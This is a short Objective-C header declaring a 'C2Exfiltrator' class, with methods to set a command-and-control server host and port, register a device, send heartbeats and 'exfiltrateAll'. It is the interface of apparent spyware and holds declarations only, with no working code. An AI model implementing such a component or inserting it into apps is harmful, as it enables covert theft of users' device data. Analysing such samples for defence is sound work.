#import <Foundation/Foundation.h>

@interface C2Exfiltrator : NSObject
+ (instancetype)shared;
- (void)setServerHost:(NSString *)host port:(NSInteger)port;
- (void)setDeviceId:(NSString *)deviceId;
- (void)registerDevice;
- (void)startHeartbeat;
- (void)exfiltrateAll;
@end